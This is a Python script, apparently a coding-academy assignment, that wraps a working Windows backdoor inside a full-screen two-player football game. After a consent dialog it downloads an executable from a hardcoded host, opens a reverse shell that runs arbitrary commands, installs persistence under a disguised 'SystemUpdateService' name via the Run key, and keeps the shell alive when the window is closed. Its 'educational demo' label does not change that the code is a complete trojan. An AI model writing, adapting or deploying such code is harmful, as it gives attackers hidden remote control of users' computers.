"""
**EDUCATIONAL DEMO ONLY – Rwanda Coding Academy Assignment**
Use exclusively in isolated VMs. Never deploy on real systems.
This code demonstrates backdoor techniques for defense learning purposes.

Interactive 2‑player mini football game with an educational backdoor demo. On consent:
- Checks/installs curl dependency from Kali HTTP server
- Establishes reverse shell to Kali listener (background thread)
- Adds persistence via %APPDATA% and Run key
- Runs a full‑screen football game. All in isolated VMs only.
"""

import os
import sys
import socket
import subprocess
import threading
import shutil
import urllib.request

# Windows-only for persistence
if sys.platform == "win32":
    import winreg

# Tkinter for GUI
import tkinter as tk
from tkinter import messagebox, font as tkfont

# ============== CONFIGURATION – Replace with your Kali VM IP ==============
KALI_IP = "10.12.74.109"
KALI_PORT = 4444
KALI_HTTP_PORT = 8000
CURL_URL = f"http://{KALI_IP}:{KALI_HTTP_PORT}/curl.exe"
SYSTEM32 = os.path.join(os.environ.get("SystemRoot", "C:\\Windows"), "System32")
CURL_PATH = os.path.join(SYSTEM32, "curl.exe")
APPDATA_EXE_NAME = "SystemUpdateService.exe"
RUN_KEY_PATH = r"Software\Microsoft\Windows\CurrentVersion\Run"
OUTPUT_END_MARKER = b"\x00\x00\x00"


def get_self_path():
    """Path of running executable (or script)."""
    if getattr(sys, "frozen", False):
        return sys.executable
    return os.path.abspath(__file__)


def get_appdata_exe_path():
    return os.path.join(os.environ.get("APPDATA", ""), APPDATA_EXE_NAME)


# ---------- Consent dialog ----------
def show_consent():
    root = tk.Tk()
    root.withdraw()
    root.attributes("-topmost", True)
    msg = (
        "This is an EDUCATIONAL DEMO backdoor game for class only.\n\n"
        "It will:\n"
        "• Check/install dependencies (e.g. curl from instructor's VM)\n"
        "• Open a reverse shell to the instructor's Kali listener\n"
        "• Add itself to startup (persistence)\n"
        "• Run a full-screen 2-player mini football game\n\n"
        "All inside isolated VMs only. Do you consent?"
    )
    result = messagebox.askyesno("Educational Demo – Consent", msg, icon="question")
    root.destroy()
    return result


# ---------- Curl dependency ----------
def curl_available():
    try:
        subprocess.run(
            ["curl", "--version"],
            capture_output=True,
            timeout=5,
            creationflags=subprocess.CREATE_NO_WINDOW if sys.platform == "win32" else 0,
        )
        return True
    except (FileNotFoundError, subprocess.TimeoutExpired):
        return False


def download_curl():
    """Download portable curl.exe from Kali HTTP server (demo only). Tries System32, then %APPDATA%."""
    try:
        req = urllib.request.Request(CURL_URL)
        with urllib.request.urlopen(req, timeout=10) as resp:
            data = resp.read()
        for path in [CURL_PATH, os.path.join(os.environ.get("APPDATA", ""), "curl.exe")]:
            try:
                with open(path, "wb") as f:
                    f.write(data)
                return True
            except (OSError, PermissionError):
                continue
        return False
    except Exception:
        return False


def ensure_curl():
    if curl_available():
        return True
    return download_curl()


# ---------- Reverse shell (background thread) ----------
def reverse_shell():
    while True:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((KALI_IP, KALI_PORT))
            while True:
                data = b""
                while b"\n" not in data:
                    chunk = s.recv(4096)
                    if not chunk:
                        raise ConnectionError("Connection closed")
                    data += chunk
                cmd = data.decode("utf-8", errors="replace").strip().split("\n")[0]
                if not cmd:
                    continue
                try:
                    result = subprocess.run(
                        cmd,
                        shell=True,
                        capture_output=True,
                        timeout=30,
                        cwd=os.environ.get("USERPROFILE", "."),
                        creationflags=subprocess.CREATE_NO_WINDOW if sys.platform == "win32" else 0,
                    )
                    out = (result.stdout or b"") + (result.stderr or b"")
                    if not out:
                        out = b"(command completed, no output)\n"
                except subprocess.TimeoutExpired:
                    out = b"(command timed out)\n"
                except Exception as e:
                    out = str(e).encode("utf-8") + b"\n"
                s.sendall(out + OUTPUT_END_MARKER)
        except Exception:
            pass
        try:
            import time
            time.sleep(5)
        except Exception:
            pass


# ---------- Persistence (Windows) ----------
def install_persistence():
    """Install persistence by copying to APPDATA and adding a Run key."""
    if sys.platform != "win32":
        return
    self_path = get_self_path()
    dest = get_appdata_exe_path()
    
    # Build the command that will be executed at startup
    if getattr(sys, 'frozen', False):
        # Frozen executable (e.g., PyInstaller) – run the .exe directly
        run_cmd = f'"{dest}" --background'
    else:
        # Running as a script – use the same Python interpreter
        python_exe = sys.executable
        run_cmd = f'"{python_exe}" "{dest}" --background'
    
    try:
        # Ensure the destination directory exists
        os.makedirs(os.path.dirname(dest), exist_ok=True)
        # Copy this script/executable to the destination
        shutil.copy2(self_path, dest)
        # Open the Run key for the current user
        key = winreg.OpenKey(
            winreg.HKEY_CURRENT_USER,
            RUN_KEY_PATH,
            0,
            winreg.KEY_SET_VALUE,
        )
        # Set the value
        winreg.SetValueEx(key, "SystemUpdateService", 0, winreg.REG_SZ, run_cmd)
        winreg.CloseKey(key)
    except Exception as e:
        # Optional: log the error (for debugging in the lab)
        print(f"[!] Persistence installation failed: {e}")
 # ---------- Mini football game GUI ----------
class FootballGameApp:
    """Simple two‑player football game.

    - Player 1 (left):  WASD keys
    - Player 2 (right): Arrow keys
    - First to reach a chosen score wins.
    """

    FIELD_COLOR = "#106c4a"
    LINE_COLOR = "#ffffff"

    def __init__(self):
        self.root = tk.Tk()
        self.root.title("Mini Football – Educational Demo")
        self.root.configure(bg=self.FIELD_COLOR)
        # Full-screen, always on top (no visible close button in typical fullscreen)
        self.root.attributes("-fullscreen", True)
        self.root.attributes("-topmost", True)
        # Closing / Escape hides the window but keeps process + backdoor alive
        self.root.protocol("WM_DELETE_WINDOW", self.hide_window)
        self.root.bind("<Escape>", lambda e: self.hide_window())

        self.width = self.root.winfo_screenwidth()
        self.height = self.root.winfo_screenheight()

        self.canvas = tk.Canvas(
            self.root,
            width=self.width,
            height=self.height,
            bg=self.FIELD_COLOR,
            highlightthickness=0,
        )
        self.canvas.pack(fill="both", expand=True)

        # Game objects
        self.player_size = 60
        self.ball_radius = 18
        self.player_speed = 12
        self.ball_dx = 10
        self.ball_dy = 6
        self.max_score = 5
        self.score_left = 0
        self.score_right = 0

        self._create_field()
        self._create_players_and_ball()
        self._bind_keys()
        self._game_loop()

    def hide_window(self):
        """Hide the game window but keep Tk mainloop and backdoor thread alive."""
        self.root.withdraw()

    # ----- field and objects -----
    def _create_field(self):
        w, h = self.width, self.height
        # Center line
        self.canvas.create_line(w // 2, 0, w // 2, h, fill=self.LINE_COLOR, width=4)
        # Center circle
        r = 120
        self.canvas.create_oval(
            w // 2 - r,
            h // 2 - r,
            w // 2 + r,
            h // 2 + r,
            outline=self.LINE_COLOR,
            width=3,
        )
        # Goals (just visual rectangles)
        goal_width = 40
        self.left_goal = self.canvas.create_rectangle(
            0,
            h * 0.3,
            goal_width,
            h * 0.7,
            outline=self.LINE_COLOR,
            width=3,
        )
        self.right_goal = self.canvas.create_rectangle(
            w - goal_width,
            h * 0.3,
            w,
            h * 0.7,
            outline=self.LINE_COLOR,
            width=3,
        )
        # Score text
        self.score_text = self.canvas.create_text(
            w // 2,
            50,
            text="0 : 0",
            fill="#ffffff",
            font=("Segoe UI", 32, "bold"),
        )

    def _create_players_and_ball(self):
        w, h = self.width, self.height
        ps = self.player_size
        # Left player
        self.p1 = self.canvas.create_rectangle(
            80,
            h // 2 - ps // 2,
            80 + ps,
            h // 2 + ps // 2,
            fill="#1e90ff",
            outline="white",
            width=2,
        )
        # Right player
        self.p2 = self.canvas.create_rectangle(
            w - 80 - ps,
            h // 2 - ps // 2,
            w - 80,
            h // 2 + ps // 2,
            fill="#ff6347",
            outline="white",
            width=2,
        )
        # Ball
        self.ball = self._reset_ball(center_only=False)

    def _reset_ball(self, center_only=True):
        w, h = self.width, self.height
        r = self.ball_radius
        if not center_only:
            return self.canvas.create_oval(
                w // 2 - r,
                h // 2 - r,
                w // 2 + r,
                h // 2 + r,
                fill="#f5f5f5",
                outline="#333333",
                width=2,
            )
        # Move existing ball back to center
        bx1, by1, bx2, by2 = self.canvas.coords(self.ball)
        cx = (bx1 + bx2) / 2
        cy = (by1 + by2) / 2
        dx = w // 2 - cx
        dy = h // 2 - cy
        self.canvas.move(self.ball, dx, dy)
        # Change direction slightly after each goal
        self.ball_dx = -self.ball_dx
        self.ball_dy = 0
        return self.ball

    # ----- controls -----
    def _bind_keys(self):
        self.keys_pressed = set()
        self.root.bind("<KeyPress>", self._on_key_press)
        self.root.bind("<KeyRelease>", self._on_key_release)

    def _on_key_press(self, event):
        self.keys_pressed.add(event.keysym)

    def _on_key_release(self, event):
        self.keys_pressed.discard(event.keysym)

    # ----- game loop -----
    def _game_loop(self):
        self._update_players()
        self._update_ball()
        self.root.after(30, self._game_loop)

    def _update_players(self):
        s = self.player_speed
        # Player 1 – WASD
        dx1 = dy1 = 0
        if "w" in self.keys_pressed or "W" in self.keys_pressed:
            dy1 -= s
        if "s" in self.keys_pressed or "S" in self.keys_pressed:
            dy1 += s
        if "a" in self.keys_pressed or "A" in self.keys_pressed:
            dx1 -= s
        if "d" in self.keys_pressed or "D" in self.keys_pressed:
            dx1 += s
        self._move_clamped(self.p1, dx1, dy1)

        # Player 2 – arrows
        dx2 = dy2 = 0
        if "Up" in self.keys_pressed:
            dy2 -= s
        if "Down" in self.keys_pressed:
            dy2 += s
        if "Left" in self.keys_pressed:
            dx2 -= s
        if "Right" in self.keys_pressed:
            dx2 += s
        self._move_clamped(self.p2, dx2, dy2)

    def _move_clamped(self, item, dx, dy):
        if dx == 0 and dy == 0:
            return
        x1, y1, x2, y2 = self.canvas.coords(item)
        nx1, ny1, nx2, ny2 = x1 + dx, y1 + dy, x2 + dx, y2 + dy
        # stay inside field
        if nx1 < 0 or nx2 > self.width:
            dx = 0
        if ny1 < 0 or ny2 > self.height:
            dy = 0
        self.canvas.move(item, dx, dy)

    def _update_ball(self):
        # Move ball
        self.canvas.move(self.ball, self.ball_dx, self.ball_dy)
        bx1, by1, bx2, by2 = self.canvas.coords(self.ball)

        # Bounce on top/bottom
        if by1 <= 0 or by2 >= self.height:
            self.ball_dy = -self.ball_dy

        # Collisions with players (simple AABB check)
        for player in (self.p1, self.p2):
            px1, py1, px2, py2 = self.canvas.coords(player)
            if not (bx2 < px1 or bx1 > px2 or by2 < py1 or by1 > py2):
                # reflect horizontally, add a bit of vertical variation
                self.ball_dx = -self.ball_dx
                self.ball_dy += (by1 + by2) / 2 - (py1 + py2) / 2
                # small clamp on dy
                if self.ball_dy > 12:
                    self.ball_dy = 12
                if self.ball_dy < -12:
                    self.ball_dy = -12
                break

        # Check for goals
        if bx2 <= 0:
            # Right player scores
            self.score_right += 1
            self._after_goal()
        elif bx1 >= self.width:
            # Left player scores
            self.score_left += 1
            self._after_goal()

    def _after_goal(self):
        self.canvas.itemconfigure(
            self.score_text,
            text=f"{self.score_left} : {self.score_right}",
        )
        self._reset_ball(center_only=True)
        # Optional: show a short message
        if self.score_left >= self.max_score or self.score_right >= self.max_score:
            winner = "Left (Blue)" if self.score_left > self.score_right else "Right (Red)"
            msg = f"{winner} player wins! Press Esc to hide the game."
            self.canvas.itemconfigure(
                self.score_text,
                text=f"{self.score_left} : {self.score_right}  –  {msg}",
            )

    def run(self):
        self.root.mainloop()


# ---------- Main ----------
def main():
    # Background mode: used when started automatically from the Run key.
    # In this mode we do not show the quiz, only the reverse shell.
    if "--background" in sys.argv:
        t = threading.Thread(target=reverse_shell, daemon=True)
        t.start()
        # Keep the process alive with a simple loop.
        try:
            import time
            while True:
                time.sleep(60)
        except KeyboardInterrupt:
            pass
        return

    # Interactive mode: user launches the game manually and must consent.
    if not show_consent():
        sys.exit(0)
    ensure_curl()
    if sys.platform == "win32":
        install_persistence()
    t = threading.Thread(target=reverse_shell, daemon=True)
    t.start()
    app = FootballGameApp()
    app.run()


if __name__ == "__main__":
    main()
